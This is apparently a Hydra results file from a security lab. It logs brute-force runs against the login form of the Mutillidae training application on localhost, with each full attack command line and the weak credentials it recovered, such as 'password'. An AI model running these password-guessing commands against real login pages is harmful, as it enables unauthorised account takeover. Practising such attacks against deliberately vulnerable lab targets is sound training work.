@@ -1,0 +1,115 @@
+# Hydra v8.6 run at 2018-11-01 18:35:59 on 127.0.0.1 http-post-form (hydra -L /tmp/usernames.txt -P /tmp/passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Login/Register)
+[80][http-post-form] host: 127.0.0.1   login: adrian   password: password1
+[80][http-post-form] host: 127.0.0.1   login: admin   password: password
+[80][http-post-form] host: 127.0.0.1   login: admin   password: password1
+[80][http-post-form] host: 127.0.0.1   login: admin   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: adrian   password: password
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password1
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password1
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password1
+[80][http-post-form] host: 127.0.0.1   login: cal   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: dave   password: password
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+[80][http-post-form] host: 127.0.0.1   login: dave   password: password1
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password1
+[80][http-post-form] host: 127.0.0.1   login: ed   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: ed   password: password1
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password1
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password1
+[80][http-post-form] host: 127.0.0.1   login: john   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: john   password: password1
+[80][http-post-form] host: 127.0.0.1   login: john   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: kevin   password: password
+[80][http-post-form] host: 127.0.0.1   login: kevin   password: password1
+[80][http-post-form] host: 127.0.0.1   login: kevin   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: patches   password: password
+[80][http-post-form] host: 127.0.0.1   login: patches   password: password1
+[80][http-post-form] host: 127.0.0.1   login: patches   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: rocky   password: password
+[80][http-post-form] host: 127.0.0.1   login: rocky   password: password1
+[80][http-post-form] host: 127.0.0.1   login: rocky   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: samurai   password: password
+[80][http-post-form] host: 127.0.0.1   login: samurai   password: password1
+[80][http-post-form] host: 127.0.0.1   login: samurai   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password1
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: Password1
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password1
+[80][http-post-form] host: 127.0.0.1   login: simba   password: Password1
+# Hydra v8.6 run at 2018-11-01 18:36:31 on 127.0.0.1 http-post-form (hydra -L /tmp/usernames.txt -P /tmp/passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password
+[80][http-post-form] host: 127.0.0.1   login: john   password: password
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password
+# Hydra v8.6 run at 2018-12-14 11:55:28 on 127.0.0.1 http-post-form (hydra -L /tmp/usernames.txt -P /tmp/passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password
+[80][http-post-form] host: 127.0.0.1   login: john   password: password
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password
+# Hydra v8.6 run at 2018-12-18 11:30:02 on 127.0.0.1 http-post-form (hydra -L /tmp/usernames.txt -P /tmp/passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password
+[80][http-post-form] host: 127.0.0.1   login: john   password: password
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password
+# Hydra v8.8 run at 2019-02-28 15:44:22 on 127.0.0.1 http-post-form (hydra -L /tmp/usernames.txt -P /tmp/passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password
+[80][http-post-form] host: 127.0.0.1   login: john   password: password
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password
+# Hydra v8.8 run at 2019-02-28 15:47:30 on 127.0.0.1 http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+# Hydra v8.8 run at 2019-02-28 15:47:59 on 127.0.0.1 http-post-form (hydra -R)
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+# Hydra v8.8 run at 2019-06-17 21:59:06 on 127.0.0.1 http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: 127.0.0.1   login: bobby   password: password
+[80][http-post-form] host: 127.0.0.1   login: bryce   password: password
+[80][http-post-form] host: 127.0.0.1   login: cal   password: password
+[80][http-post-form] host: 127.0.0.1   login: dreveil   password: password
+[80][http-post-form] host: 127.0.0.1   login: jeremy   password: password
+[80][http-post-form] host: 127.0.0.1   login: jim   password: password
+[80][http-post-form] host: 127.0.0.1   login: john   password: password
+[80][http-post-form] host: 127.0.0.1   login: scotty   password: password
+[80][http-post-form] host: 127.0.0.1   login: simba   password: password
+# Hydra v9.0 run at 2020-04-30 18:43:55 on 127.0.0.1 http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt 127.0.0.1 http-post-form /mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+# Hydra v9.0 run at 2020-04-30 18:44:31 on mutillidae.local http-post-form (hydra -L usernames.txt -P passwords.txt -t 5 -w 30 -o hydra-http-post-attack-results.txt mutillidae.local http-post-form /index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:S=Set-Cookie\: username)
+[80][http-post-form] host: mutillidae.local   login: bobby   password: password
+[80][http-post-form] host: mutillidae.local   login: bryce   password: password
+[80][http-post-form] host: mutillidae.local   login: cal   password: password
+[80][http-post-form] host: mutillidae.local   login: dreveil   password: password
+[80][http-post-form] host: mutillidae.local   login: jeremy   password: password
+[80][http-post-form] host: mutillidae.local   login: jim   password: password
+[80][http-post-form] host: mutillidae.local   login: john   password: password
+[80][http-post-form] host: mutillidae.local   login: scotty   password: password
+[80][http-post-form] host: mutillidae.local   login: simba   password: password
